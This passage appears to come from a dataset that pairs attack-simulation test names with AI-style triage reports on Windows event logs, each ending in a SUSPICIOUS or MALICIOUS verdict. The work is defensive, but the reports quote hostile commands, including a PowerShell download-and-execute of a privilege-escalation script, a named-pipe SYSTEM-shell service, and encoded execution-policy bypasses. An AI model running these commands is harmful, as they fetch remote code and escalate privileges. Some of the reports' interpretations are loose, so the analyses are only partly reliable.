3. **Inspect and Clean Affected Systems:** Use updated antivirus and endpoint detection tools to remove detected malicious payloads.
4. **Review Network Traffic:** Analyze network logs for any data exfiltration or command and control traffic.
5. **Update Systems and Audit Accounts:** Ensure all systems are properly updated with security patches and review user account privileges.
6. **Strengthen Monitoring:** Implement stricter monitoring policies around PowerShell usage and potential script exploitations.

This analysis serves to guide immediate response efforts maintaining the integrity and security of your network environment."
Create a Process using obfuscated Win32_Process,"Upon reviewing the provided logs, several points warrant attention regarding potential malicious activity, with a specific focus on the Windows PowerShell and Sysmon logs. Below is a detailed analysis:

### Findings:

1. **PowerShell Logs Analysis:**
   - The PowerShell logs capture events with a script executing a command that involves creating a new `Win32_Process` object and subsequently attempting to create a new management class (`Win32_file`). The script then uses `Invoke-WmiMethod` to create a new process running `notepad.exe`.
   - While `notepad.exe` itself is not inherently malicious, the methodology of using PowerShell to employ WMI calls and create processes is a known tactic in executing malicious payloads. This can be indicative of Living-off-the-Land (LotL) techniques, often used by attackers to evade detection.

2. **Sysmon Logs Analysis:**
   - A significant observation is the execution of `powershell.exe` with a high integrity level, which matches the PowerShell events. This reinforces the finding of an orchestrated execution of PowerShell scripts.
   - The `whoami.exe` and `conhost.exe` processes are seen frequently, which in itself is not suspicious without context, but given the presence of the suspicious PowerShell activity, reviewing their correlation for any privilege check or process spawning chain is advisable.
   - The creation of `notepad.exe` directed from PowerShell/WMI actions as seen in process logs suggests that this is not user-driven but rather automated, likely by the script noted in the PowerShell log.

3. **Timestamp and Context:**
   - The suspicious PowerShell activities are closely time-aligned with the Sysmon logs describing process creations and existing system service activities.
   - Notably, these activities are logged during regular operations of scheduled system tasks, but the PowerShell involvement centrally matches behavior patterns indicative of lateral movement or payload setup stages seen in many breach scenarios.

### Conclusion:

The use of PowerShell in combination with WMI to create processes is a red flag for suspicious and potentially malicious activity. Although the execution of `notepad.exe` does not immediately imply a malicious act, the methods employed align with tactics for bypassing endpoint defenses and executing foreign scripts or malware.

### Resolution:

- **Classification: SUSPICIOUS**
  - The activity captures suspicious PowerShell execution patterns using WMI interfaces, which could indicate an attempt at executing unauthorized or harmful scripts. Further investigation and context are essential to confirm malicious intent.
  
### Guidance:

- **Immediate Actions:**
  - Isolate the impacted host for a deeper forensic analysis.
  - Review corresponding event logs around the same timeframe for additional signs of unauthorized access or data manipulation.
  - Verify the source and intent behind the PowerShell scripts found; ensure they are not part of legitimate scheduled tasks or scripts with administrative approval.
  
- **Long-term Measures:**
  - Implement stricter PowerShell execution policies to prevent unauthorized script execution, and consider using constrained language mode.
  - Enhance logging across the infrastructure to better capture and correlate such activities with network and endpoint defenses.
  - Review user permissions and harden WMI permissions and services against unauthorized access."
Create a Process using WMI Query and an Encoded Command,"**Analysis of Windows Event Logs**

### Overview

The logs provided from a Windows machine cover various activities captured by Sysmon, PowerShell, Security, System, and Application logs. The task is to evaluate these logs for any indicators of malicious activity, such as unauthorized access, command execution with suspicious parameters, or any unusual patterns that may indicate a security breach or compromise.

### Sysmon Log Analysis

1. **Process Execution**:
   - **Wevtutil.exe Execution**:
     - Several instances of `wevtutil.exe` are observed running, including process IDs 2624, 5944, 4256, 672, and 4544, all executed by a user with admin rights (`SERVER002\\admin_test`).
     - `Wevtutil.exe` is typically used to manage event logs, and frequent usage, especially by an admin account, could indicate log manipulation or investigation.

   - **Usage of cmd.exe and PowerShell**:
     - `cmd.exe` executed with command-line: `cmd.exe /c powershell -exec bypass -e SQBuAHYAbw...`. This style of execution via cmd signals a base64-encoded PowerShell script, which is often used to obfuscate malicious intent.
     - The encoded command reveals an obfuscated activity potentially harmful.

2. **WhoAmI and HostName Execution**:
   - `whoami.exe` and `hostname.exe` are used to gather about the system user and network position, possibly indicating reconnaissance efforts within the environment.

### Windows PowerShell Log Analysis

- The PowerShell logs include events with `-exec bypass` command, which bypasses the script execution policy, possibly indicating an attempt to execute unauthorized scripts without raising an alert.

### Security Log Analysis

- **Time Manipulation**:
  - The security and system logs indicate time adjustments by `svchost.exe`. Unexplained time changes can be suspicious, as attackers might alter time settings to cover tracks in logs.

### System Log Analysis

- Time source changes related to `svchost.exe` were noted. This could be standard behavior if sync settings were changed but requires correlation with administrative actions.

### Indicators of Malicious Activity or Compromise

- **Encoded PowerShell Command**: The presence of encoded PowerShell commands with `-exec bypass` is a significant red flag, pointing to potentially harmful activities executed without user awareness.
- **Frequent Log Management Commands**: The frequent use of `wevtutil.exe` by the admin user suggests possible tampering with event logs to hide activities.
- **Time Alterations**: Time changes traced to `svchost.exe` could suggest attempts to obscure log evidence.

### Assessment

Based on the analysis, the logs exhibit multiple suspicious activities:
- The encoded PowerShell command execution.
- Potential log manipulation activities.
- Changes in system time settings shortly after or before these activities.

**Resolution: MALICIOUS**

### Guidance on How to Proceed

Given the identified indicators of compromise, it is crucial to:
- Immediately isolate the affected system to prevent further compromise or lateral movement.
- Conduct a full forensic investigation to trace the origin and method of intrusion.
- Review and enhance PowerShell execution policies and logging.
- Audit all administrative actions and validate the credentials used during the suspicious times, ensuring MFA is enforced where possible.
- Implement robust monitoring for early detection of such patterns in the future."
WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,"Upon reviewing the provided Windows event logs, several indicators of potentially malicious activity suggest a compromise of the system. Here is a detailed breakdown:

1. **Security and Sysmon Logs:**
   - **Process Creation:** There are several indicators of potential exploitation through PowerShell:
     - Execution of `powershell.exe` with commands to download and execute scripts from external URLs (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1`). PowerShell downloads and executes scripts from online sources is commonly associated with malicious activity, especially when done in such a manner that attempts to obfuscate or hide intentions.
     - Creation of an unauthorized service `svcHighPriv` using PowerShell to execute a command via `cmd.exe` (`cmd.exe /C echo Uuup! > \\.\pipe\HighPriv`) indicates attempted privilege escalation or backdoor access using named pipes. This pattern is often seen in privilege escalation exploits where high privilege services are created and subsequently used to gain elevated access.
     - The stopping and deletion of the `svcHighPriv` service further indicates an attempt to clean traces, often a sign of post-execution attempts to cover tracks in a compromised system.

2. **Windows PowerShell Logs:**
   - The logs revealed multiple instances of downloading and executing scripts from an untrustworthy online repository using PowerShell. The use of `iex(new-object net.webclient).downloadstring(...)` is a classic sign of script-based attacks to execute code from malicious servers.

3. **Service Control Manager Logs:**
   - There are events indicating both the attempted and failed starting of a user-mode service `svcHighPriv`. The logs show that the service was subsequently deleted using `sc.exe`. Such behavior is highly indicative of an attempt to achieve persistence through malicious services, followed by concealment from detection mechanisms.

4. **General Observations:**
   - Use of `conhost.exe` and `cmd.exe` with unusual command lines indicate an execution environment attempting to execute and hide potentially harmful command lines.
   - The presence of `Sysmon` Event ID 1 (Process Creation) showing PowerShell invoking scripts from a remote server matches TTPs (Tactics, Techniques, and Procedures) associated with malware delivery via downloaded payloads.

**Threats & Risks Identified:**
- The combination of unauthorized service creation and script execution identifies a potential breach with possible remote code execution (RCE).
- Unauthorized high privilege activities suggest the attacker aimed for privilege escalation.
- Potential persistence and lateral movement risks due to the nature of service installations and script execution.

**Guidance on How to Proceed:**
- Isolate the affected machine immediately to prevent further threat actor activities.
- Conduct a thorough investigation on the network to identify lateral movement.
- Perform a root-cause analysis to understand the entry vector and mitigate the vulnerability exploited.
- Review and enhance endpoint detection and response policies to cover script-based and service-based threats.
- Forensic analysis is recommended to ensure that no residuals of the attack are left within the system and network.

**Resolution:** MALICIOUS

The logs clearly indicate unauthorized and potentially harmful actions typical of malicious usage aiming at compromise. Further investigation and response activities are necessary to ensure that the threat is fully contained and remediated."
WMI Reconnaissance Software,"Upon analyzing the provided Windows event logs, here are my observations:

1. **Security Log Analysis**:
   - Event ID 4616: The logs indicate that there's a time change event. This behavior could suggest unauthorized activity, as time changes are often used in malicious activities. However, these time adjustments were performed by the `LOCAL SERVICE` (SID S-1-5-19), a system-level account, indicating a possible benign time synchronization.
   
2. **Sysmon Log Analysis**:
   - Event ID 5: Multiple instances of `wevtutil.exe` and `conhost.exe` are executed by the `admin_test` user. `wevtutil.exe` is typically used for managing event logs, and its repeated execution is suspicious if not a part of routine administrative tasks.
   - Event ID 1: The process `cmd.exe` is used to run a command `wmic qfe get description,installedOn /format:csv`. This command fetches installed hotfixes and their installation dates. While the use of `wmic` can be common in routine administrative tasks, its execution in conjunction with other suspicious activities can stand out.
   - Execution from `wsmprovhost.exe` is noted, which is associated with remote PowerShell sessions. This might suggest remote administration or an attempted covert operation.

3. **Application Log Analysis**:
   - Event ID 16384: Relates to Microsoft's Software Protection Platform, which is benign and doesn't indicate malicious activity.

4. **System Log Analysis**:
   - There are multiple time change logs, which as explained in the security log analysis, represent a potential for concern due to time manipulation possibilities. However, no explicit suspicious behavior or processes initiate these, as they seem tied to system operations.

**Assessment and Conclusion**:
- The time change entries, although unusual, don't provide definitive proof of malicious activity without other contexts or correlating events indicating compromise.
- The execution of `wevtutil.exe` and `conhost.exe` by a user account is worth further scrutiny. These could indicate attempts to alter or access system logs or could be part of benign administrative tasks.
- The use of `cmd.exe` to run `wmic` commands suggests potential scripting or scheduled tasks that should be verified for authenticity.

**Resolution**: **SUSPICIOUS** - The logs contain activities mainly around log management and system information queries, which could be legitimate administrative activities or steps towards malicious actions such as log clearing or environment information gathering. It's essential to verify the context and purpose of these executions. Further investigation is required to determine if this activity aligns with documented tasks or represents unauthorized actions.

**Guidance on How to Proceed**:
- Verify whether the `admin_test` user account activity aligns with expected administrative tasks. If not, investigate for potential account compromise.
- Check for other logs or indicators that might tie into these actions for a broader context around this timeframe. 
- Review any remote access records or policies surrounding the use of `wsmprovhost.exe`.
- Continuously monitor similar activities to detect potential escalations or unauthorized changes."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,"In my analysis of the provided Windows event logs from the specified time, several behaviors could be interpreted as suspicious and warrant further investigation.

1. **Usage of PowerShell**:
   - The logs indicate multiple instances of `PowerShell.exe` execution on `Server002` under the user `admin_test`. In particular, event ID ""600"" (indicating PowerShell start) occurs, with the unusual command line: `powershell.exe & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop}`. The usage of encoded commands can be a tactic used by adversaries to obfuscate their actions and bypass detection mechanisms. Given that PowerShell can provide extensive access and control to a system, such usage, especially with encoded commands, is a strong indicator of potentially malicious activity.

2. **Frequent Execution of Utilities**:
   - Throughout the logs, there is a frequent execution of utilities associated often with host information gathering and possibly with malicious recon activities. Tools like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` are seen running several times in rapid succession.
   - These processes can be legitimate when conducted by an administrator, but if executed in a close timeframe repeatedly, it could depict a pattern that resembles reconnaissance or preparation phases for a more complex attack.

3. **Sysmon Event ID 5**:
   - We see Event ID 5 from Sysmon (indicating process terminate), which captures the termination of several processes. Terminating processes like `WindowsPowerShell` or `wevtutil.exe` is not inherently malicious, but it can be part of a script or manual process conducted by an attacker. 
   
4. **Absence of Security Logs**:
   - No significant security log entries are given which are the key logs for identifying explicit unauthorized access attempts. However, normal interactions usually result in user logons/logoffs being documented.

5. **Network Services**:
   - Processes like `sppsvc.exe` (Software Protection Platform Service), running under NETWORK SERVICE, are standard background services in a Windows environment dealing with system licensing and related operations. No direct indication here of malicious activity, but its occurrence alongside the described PowerShell activity should not be discounted.

6. **Benign-looking System Updates**:
   - Multiple entries account for Windows update activities, which appear normal and not interconnected with potential malicious activity.

### Assessment:

The combination of encoded PowerShell commands and rapid sequential execution of reconnaissance and administrative command-line utilities (such as `wevtutil.exe`, `whoami.exe`, and `HOSTNAME.EXE`) is highly unusual and suspicious. While any of these individually may be benign activities or part of regular administration, the encoding of PowerShell commands can be a concern for obfuscation of potentially harmful command series.

### Resolution: 

**SUSPICIOUS**

The activities recorded in the logs do not provide irrefutable evidence of an intrusion or compromise but do reveal potential abnormal activities that could hint at a reconnaissance phase or unauthorized use of privileges.

### Guidance for Next Steps:

- **Conduct further analysis** on the origin of these PowerShell commands to understand their purpose or if they relate to any known encoded threats.
- **Review user activity logs and system/network changes** around the activities.
- **Check for any anomalies in security logs** related to unauthorized access.
- **Conduct deeper forensics examination** of files or registry changes corresponding to the sysmon events.
- Ensure that the `Server002` is appropriately patched and user rights, especially for `admin_test`, are according to the least privilege principle."
OSTap Style Macro Execution,"**Analysis:**

Upon reviewing the provided log entries, there are several elements that warrant attention from a potential security threat perspective:

1. **PowerShell Execution with Suspicious Commands:**
   - Multiple logs from the Sysmon and Windows PowerShell logs indicate that the `PowerShell.exe` command has been executed with potentially malicious intent. 
   - The command line includes a script from a remote URL `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`. This script is downloaded and executed in-memory using `Invoke-Expression (IEX)` and `Invoke-MalDoc`.
   - Moreover, the PowerShell script appears to be creating and running a JScript file (`C:\Users\Public\art.jse`) using `cscript.exe`. Such activity is indicative of an attempt to execute a malicious scripted payload, which often happens in malware attacks.

2. **Creation and Execution of JScript File:**
   - The sequence to create and execute a `.jse` file (`art.jse`) is apparent from the PowerShell commands in the logs, suggesting the insertion of potentially malicious script content to automate actions on the compromised system. This is a classic method used by attackers to run code undetected by bypassing certain security controls.

3. **Use of High Privileged User:**
   - Actions such as spawning of processes (like `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe`) are run under high integrity level using `SERVER002\admin_test` account. Although these processes by themselves could be benign, given the context of their execution after potentially malicious PowerShell commands, they contribute to the suspicion of malicious activities.

4. **Sysmon Logs – Parent Processes:**
   - The use of `wsmprovhost.exe` as the parent process, which executed the initial invocation of `PowerShell`, suggests the use of Windows Management Instrumentation (WMI), another tool often leveraged in attack chains to remotely execute scripts.

5. **Overall Process Creation and Use of System Utilities:**
   - Numerous system utilities are observed to be executed (`conhost.exe`, `wevtutil.exe`, `taskhostw.exe`, etc.) which are legitimate Windows executables, but in this case appear within the context of suspicious activities following the execution of the malicious PowerShell scripts.

**Assessment:**
The series of events captured in the logs, including unauthorized script execution via PowerShell with elevated privileges, the suspicious creation of a script file, and execution of various system utilities immediately afterward, strongly suggest malicious activity. The PowerShell script is likely part of a payload designed to perform actions without the user's consent, typical of a malware or a sophisticated attack sequence exploiting native Windows functionalities.

**Resolution:**

- **Resolution Outcome:** MALICIOUS

**Guidance and Next Steps:**

1. **Immediate Isolation:** Initiate containment procedures to isolate `Server002` from the network to prevent any lateral movement or data exfiltration.
   
2. **Detailed Forensics:** Perform an in-depth forensic analysis to understand the scope and impact, including searching for any additional artifacts, malicious files, or scripts that might be present on the system.

3. **Review User Accounts and Permissions:** Check the `admin_test` account and other privileged accounts for unauthorized changes or usage.

4. **External Communication:** Verify any external communication that might have occurred from the system to external IP addresses or domains, and block suspicious connections.

5. **System Restore and Security Patch:** If possible, consider restoring the system to a known safe state and ensure all security patches are applied.

6. **Update Security Measures:** Review firewall rules, intrusion detection/prevention systems, and antivirus definitions to bolster defenses against similar threats.

7. **End-User Awareness:** Educate employees about the potential phishing or malicious file scenarios that could lead to such compromises.

By taking these steps, the company can address the immediate threat while preparing its systems against future attacks."
Malicious Execution from Mounted ISO Image,"Based on the provided Windows event logs, the following analysis outlines suspicious activities that can be observed:

### Analysis of Logs:

#### PowerShell Logs:
- The PowerShell logs indicate an execution of a script that attempted to download a file `""qbot-test.iso""` from an external GitHub repository and mount it as a disk image. This was immediately followed by an attempt to execute `calc.exe.lnk` from the mounted volume. This sequence of actions is particularly suspicious as it may indicate an attempt to introduce and execute malicious software on the system. The presence of `IEX (Invoke-Expression)` and `iwr (Invoke-WebRequest)` in the command line is often used for executing scripts remotely and is a common tactic in attacks.

#### Sysmon Logs:
- The Sysmon logs capture detailed activity around potential execution of commands involving `download` and `run`, which may be consistent with malware behavior. The specific processes created in conjunction with the PowerShell activity, including disk mounting and manipulation of system-level binaries, are consistent with an attempt to deploy malware or perform unauthorized actions.
- The application `""RUXIMICS.exe""` is running with a system-level integrity and executing operations like `onlyloadcampaigns`, which is unusual and could be part of a larger pattern of abuse, especially if directed from a compromised script or process.
- The execution of `calc.exe` originating from a potentially malicious PowerShell script is confirmed in Sysmon events, indicating it indeed ran, which supports the hypothesis of malicious activity.

#### Application Logs:
- Logs show `edgeupdate` service stopping, potentially related to Edge updates or manipulations being interrupted or modified, though it requires further detailed investigation, but in conjunction with suspicious PowerShell and Sysmon activity, it adds weight to potentially unwanted actions taking place during the same timestamp.

#### Security Logs:
- Various 4624 and 4672 security events indicating SYSTEM account operations do not directly point toward suspicious activities alone; however, in conjunction with other red flags, these could suggest systemic hijack or misuse.

### Conclusion:
Considering the analysis of the PowerShell, Sysmon, and Application logs and the coherent timeline of potentially malicious activities, it appears highly likely that there has been an attempt to compromise the system using a downloaded script and subsequent execution of a file with administrative privileges. The behavior shown is effectively indicative of a script or malware attempting to exploit the system.

### Resolution:
- **MALICIOUS**: The logs contain evident indicators of malicious activity. An immediate response is recommended, including isolating the affected system, conducting a thorough malware analysis, reviewing the network for further threats, updating antivirus definitions, and hardening system defenses.

### Guidance:
1. **Isolate Affected Machine:** Disconnect the device from the network to prevent further spread or data exfiltration.
2. **Conduct Detailed Forensic Analysis:** Examine the downloaded file and executed processes for malicious payloads.
3. **Patch and Update Systems:** Ensure all systems are up-to-date with security patches, especially for any known vulnerabilities.
4. **Review Security Policies and Procedures:** Strengthen endpoint defenses and review network and user activity logs for anomalies.
5. **User Training and Awareness:** Educate users about phishing and suspicious activities to prevent similar incidents in the future."
Cobalt Strike Artifact Kit pipe,"### Detailed Analysis

Upon analyzing the provided logs, several items of interest and potential concerns arise:

#### Sysmon Logs:
1. **Named Pipes Activity**:
   - Execution of `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` from a temporary directory is noted. These files' paths, especially from a temporary location and with such functionality, could indicate a potentially suspicious activity. It is uncommon for legitimate software to operate from these locations unless it's during an installation or update process, but without clear context, this warrants a deeper investigation.

2. **Processes with Elevated Privileges**:
   - Execution of well-known system binaries like `powershell.exe`, `wevtutil.exe`, and `conhost.exe` by a user `SERVER002\\admin_test`, often in quick succession, can be suspicious. Particularly concerning if the command-line executions include unusual options or commands, which is not provided in detail here.

3. **Unusual Command-Line in `conhost.exe`**:
   - The command line options such as `0xffffffff -ForceV1` could be benign, related to terminal control, but should be checked against normal usage patterns for any deviations specific to this environment.

#### Security Logs:
1. **Privilege Escalation**:
   - Event ID 4672 logs indicate privileges typically required for specific administrative tasks. If these privileges were granted to unexpected or unauthorized users, or at unexpected times, they could indicate malicious escalated access.
  
2. **Account Queries**:
   - Numerous `4798` events indicate enumeration of user accounts (`Administrator`, `admin_test`, `DefaultAccount`, `Guest`, `lplui`). Such enumeration might suggest reconnaissance activities by an attacker trying to ascertain user accounts on the system.

#### Application Logs:
1. **Edge Updates**:
   - Multiple entries related to `edgeupdate` service stopping could be standard behavior during an update. However, if these stop unexpectedly or correspond with network traffic patterns suggesting data exfiltration or download of unauthorized payloads, they could pose a concern.

### Assessment:
Given the observed patterns:

- The `namedpipes` executors running from a temporary directory are particularly out of the ordinary without clear legitimate context or description in your environment.
- High integrity level processes executed from unexpected directories can signal an IOA (Indicator of Attack).
- Privilege escalation logs suggest possible unauthorized accesses or at least require confirmation of their alignment with known administrative tasks or users.

### Resolution:
**SUSPICIOUS**

### Guidance:
1. **Immediate Actions**:
   - Further investigate the execution of processes from the temporary directory. Check if the executables have been verified as part of legitimate software or deployment processes.
   - Analyze the network traffic associated with named pipe executables to ensure no unauthorized data transfers are occurring.
   - Review the account access logs and ensure all login events are legitimate and expected.
 
2. **Monitoring & Investigation**:
   - Set up alerting for processes being run from unexpected directories, particularly involving system and network-critical utilities.
   - Expand the scope to check for any related security events on other systems in the network which might indicate lateral movement or pivot activities.
  
3. **Consultation**:
   - Consult with the incident response or IT team to verify if the activity corresponds with any sanctioned tests, software updates, or deployment practices.
   - Consider engaging threat intelligence or forensic teams if explanations for named pipes activity, especially, cannot be immediately clarified.

In summary, while the activity is suspicious, there's a need for further investigation to confirm if it constitutes a realistic threat or if benign explanations are available."
Pipe Creation - PsExec Tool Execution From Suspicious Locations,"Upon analyzing the logs provided, I've identified several points of interest that warrant investigation:

1. **Usage of PsExec (Sysmon and System Logs)**:
   - The System log details a service installation with Event ID 7045, which indicates the installation of a service named ""PSEXESVC"" running the executable `%SystemRoot%\PSEXESVC.exe`. This service is installed by `NT AUTHORITY\SYSTEM` and suggests the use of Sysinternals PsExec, a legitimate tool that can be used for remote command execution.
   - The Sysmon log corroborates this by showing the execution of `PsExec.exe` from `C:\Users\Public\Temp\`, executed by a user `SERVER002\admin_test`.

2. **PowerShell Execution**:
   - The Windows PowerShell log records show the execution of multiple PowerShell instances. A command specifically highlights the use of `PsExec.exe` to open a command prompt with system privileges (`cmd -accepteula`).
   - Another PowerShell command appears on the logs, executing a script to identify specific '.inf' files indicative of potential privilege escalation or system probing.

3. **Security Logs Indicating Privileged Access**:
   - Event ID 4672 in the Security logs indicates that the user `admin_test` obtained special privileges. The privileges listed include `SeDebugPrivilege`, `SeBackupPrivilege`, and others that can allow significant control over the system, including process debugging and system modification capabilities.
   - Event ID 4624 indicates a successful logon with NTLM authentication and elevated token status for `admin_test`.

4. **Use of Conhost and Other System Processes**:
   - Several executions of `conhost.exe` are reported in the Sysmon logs. Conhost is typically launched to display command prompt-related UI elements but, when in conjunction with PsExec and PowerShell activity, could potentially indicate interactive shell or script usage.

5. **Normal Software Updates and Maintenance Tasks**:
   - The logs detail a number of Windows Update Client events indicative of regular updating activity.
   - Various processes related to system maintenance and administrative tasks are present, such as `CompatTelRunner.exe` activities related to telemetry.

### Assessment:
The presence of PsExec being executed from a temporary user folder, combined with the launch of PowerShell scripts that potentially probe system files or execute commands with elevated privileges, is concerning. The usage pattern and the environment (`admin_test` account, elevated privilege sessions) suggest potential unauthorized or malicious use, possibly indicating a live intrusion or post-exploitation activity.

### Resolution:
- **SUSPICIOUS**: The logs present activity that, while potentially legitimate administrative actions via PsExec, could also be used for malicious purposes. The context (temporary directory execution, elevated privilege usage) requires further investigation to ensure these are legitimate and sanctioned administrative activities, checking for unauthorized access or consistency with known administrative tasks.

Moving forward, I recommend:
- Reviewing current administrative tasks and any justification for the specific use of PsExec.
- Auditing user activity, especially of `admin_test`, and verifying if the PsExec use aligns with its duties.
- Investigating any unauthorized changes or unexpected files/applications present in temporary directories.
- Considering network activity review to correlate any anomalies or unauthorized accesses correlating with the logged events."
Cobalt Strike post-exploitation pipe (4.2 and later),"Upon reviewing the provided Windows event logs, several entries suggest potentially suspicious or anomalous behavior that may indicate malicious activity. Let's analyze the logs:

### Security Log
1. **EventID 4672: Special Privileges Assigned**  
   - The user `admin_test` is being assigned a range of privileges, including `SeDebugPrivilege`, which is often a sign of potential privilege escalation attempts or administrative actions. These privileges could be misused for malicious purposes if obtained by a non-legitimate user or process.

2. **EventID 4624: Successful Logon**  
   - The user `admin_test` successfully logs in using NTLM authentication. This by itself is normal unless correlated with unauthorized access attempts or times when the user is not usually active (requires further context).

### Sysmon Log
1. **Multiple Processes Executed under USER: SERVER002\\admin_test**
   - Execution of `powershell.exe`, `wevtutil.exe`, and `cmd.exe` among others. The presence of `wevtutil.exe` could indicate event log clearing or manipulation, which is commonly linked with attacker activities attempting to erase traces.

2. **Command Line Anomalies**
   - Specific entries, such as `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\build\namedpipes_executor.exe"" --pipe 4`, indicate the execution of potentially unauthorized binaries from user directories. This is highly suspicious as it resembles classic behaviors of malicious executors, and the file path suggests possible obfuscation or attempt to evade detection mechanisms.

3. **Executable Files in Temporary Directories**
   - Execution of executables (`namedpipes_executor.exe`, `namedpipes_server.exe`, `namedpipes_client.exe`) from temporary directories is uncommon for legitimate system activities and could indicate that payloads or scripts are being run as part of a malicious campaign.

4. **Frequent Use of `conhost.exe`**
   - Often linked with cmd.exe or other console applications, frequent triggering of `conhost.exe` could be benign, but in a suspicious context, may hint at script execution.

### Application and System Logs
- Entries in the application log relate to standard operations like those from the Software Protection Platform, suggesting routine checks and verifications.
- No entries were provided from the System log, making it difficult to correlate potential system-related activities.

### Assessment
The combination of privilege assignments, execution of several system utilities often used in lateral movement or privilege escalation (e.g., `powershell.exe`, `wevtutil.exe`), and the execution of unknown software (`namedpipes_executor.exe` and associated binaries) suggests suspicious activity. The identified behaviors can potentially correlate with known tactics used by adversaries during exploitation and persistence phases within a network.

### Resolution: **SUSPICIOUS**

### Guidance
1. **Immediate Actions**
   - Isolate the host from the network to prevent further potential exfiltration or lateral movement.
   - Perform a forensic analysis on the `admin_test` user’s session logs and activities.
   - Gather and preserve any additional logs, particularly those from hosts or systems that might have communicated with this server during the logged time frame.

2. **Investigative Actions**
   - Analyze the `namedpipes_executor.exe` and associated binaries for known malware signatures or behaviors.
   - Check for anomalous network connections initiated by the server correlating to the log times.
   - Verify the legitimacy of the `admin_test` account's activities and ensure the account credentials have not been compromised.

3. **Preventative Measures**
   - Implement stricter privilege management and monitoring protocols.
   - Consider deploying advanced threat detection solutions to monitor for similar activities in real-time.

Further investigation is necessary to confirm or refute a compromise, focusing on both identifying potential malware and determining the full scope and method of a potential breach."
WMI Reconnaissance List Remote Services,"After analyzing the provided Windows event logs, here is a breakdown of the potential indicators of compromise or suspicious activity observed:

1. **Time Change Events (Event ID: 4616, Kernel-General Event ID: 1):**
   - The logs indicate multiple instances of system time changes that could potentially mask sets of activities. This is highlighted in Security Logs (Event ID 4616) and System Logs (Kernel-General Event ID 1).
   - While system time changes can be normal under administrative changes, frequent or unordinary time adjustments without a clear justification could indicate attempts to manipulate time for malicious purposes (e.g., to bypass time-based security controls or logs integrity compromises).

2. **Privilege Use (Event ID: 4672):**
   - There is an event where privileges such as `SeDebugPrivilege` and others, are being assigned to the `admin_test` user. The `SeDebugPrivilege`, in particular, can be used to perform advanced operations including the ability to work with any process for debugging purposes. This is normally used by system users and could be a sign of privilege abuse when seen anomalously.

3. **New Logon (Event ID: 4624):**
   - Logon event from an external workstation `DESKTOP-3HL5B2P` with NTLM authentication type suggests a network logon event. While NTLM logons can be legitimate, they also present a risk of pass-the-hash attacks if used insecurely.

4. **Process Creation Logs (Sysmon Events):**
   - Numerous instances of processes like `wevtutil`, `wmic`, and scripts run using `CMD.exe` are indicative of administrative activities.
   - Specifically, execution of commands like `whoami`, `hostname`, and checking services (`Spooler`) using WMIC could potentially be part of routine checks or diagnostics but can also be part of reconnaissance activity performed by an intruder.
   - `wevtutil.exe` task performed by the `admin_test` suggests command line logging or querying which while typical under scrutiny or logs management contexts can also facilitate evidence removal under attacker scenarios.

5. **Application Logs:**
   - The log contains a typical software protection platform event with ID 16384 which marks the regular operation, without apparent suspicious details.

**Assessment:**

Based on the above observations:

- The system demonstrates several indicators that could suggest either sophisticated misuse by an insider or misuse by an unauthorized external user aiming to cover tracks or escalate privileges.
- The frequency and mix of events warrant further investigation as they showcase activities that could be part of enumeration, privilege abuse, or preparation for data exfiltration or lateral movement.

**Resolution: SUSPICIOUS**

**Guidance:**

- Conduct further detailed analysis to determine the legitimacy behind the time change events and process executions.
- Verify and audit the administrative actions performed by `admin_test` including the justification and context behind the privileges assigned and processes started.
- Investigate the source and intent of the network logons, particularly focusing on NTLM network logins that could indicate pass-the-hash risks.
- If malicious activity is confirmed, initiate incident response protocols to mitigate any potential threats to enterprise security."
WMI Reconnaissance Users,"### Analysis of Windows Event Logs

Upon reviewing the provided event logs from the Windows host, several patterns and events were noted. Here's a breakdown of findings from each log category:

#### Application Log
- **Event ID 16384** from Software Protection Platform Service appears to be routine activity related to software protection rules. No anomalous behavior was observed in this log entry as such events are typically benign and part of regular Windows operations.

#### Security Log
- **Event ID 4616** indicates changes in system time by the `LOCAL SERVICE`, which can sometimes be abused to manipulate timestamps for malicious activities. However, these changes seem to be part of a normal system process (`svchost.exe`).
- **Event ID 4634 and 4624** highlight that an `admin_test` user account logged off and logged in using NTLM authentication from a workstation `DESKTOP-3HL5B2P`, with elevated privileges like `SeDebugPrivilege` and more. This could warrant further investigation as such privileges are sensitive.
- **Event ID 4672** shows the granting of special privileges to `admin_test`. This could indicate potential misuse if not expected.
- **Event ID 4798** reflects enumeration of various user accounts by `admin_test` using `WmiPrvSE.exe`, which is generally routine but should be checked if this action wasn’t supposed to occur.

#### Sysmon Log
- **Event ID 1 and 5**: Multiple executions of system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by `admin_test` were recorded. While these are common processes, regular audits should ensure they align with expected administrative tasks. 
- A specific usage in Sysmon shows `cmd.exe` with a command invoking `wmic useraccount get /ALL /format:csv`, which could be seen as reconnaissance or inventory operations. It’s usually legitimate if done for administrative purposes.
  
#### System Log
- **Event ID 1 and 24** in Kernel-General logs denote time adjustments, likely normal synchronization operations by `svchost.exe`.
- **Event ID 35** from Time-Service shows regular synchronization with a time server.

### Assessment
The logs contain high-privilege activity performed by the `admin_test` account. This could either be routine administrative tasks or potentially suspicious due to the elevated privileges and accessing user account information extensively.

### Threats and Risks Identified
- The key focus area is the activities performed by the `admin_test` account, including the use of elevated privileges and access to user account information. If these actions are not routine for this account, they might indicate jeopardizing system security.

### Guidance
1. **Validation**: Confirm whether the `admin_test` account actions were authorized and align with expected tasks for this user.
2. **Access Review**: Audit user permissions and access levels to ensure they are appropriate for the tasks performed.
3. **Network Monitoring**: Continue monitoring for anomalies in similar logons and permission escalations, especially on critical systems.

### Resolution
Given the nature of the activities:

- **Resolution**: **SUSPICIOUS**

The logs reflect potentially suspicious activity that needs more investigation to definitively declare them as malicious or benign. It's recommended to explore the actions of the `admin_test` account further, particularly regarding privilege usage and account enumerations."
Command Prompt read contents from CMD file and execute,"Based on the logs provided, here's a detailed analysis and final assessment:

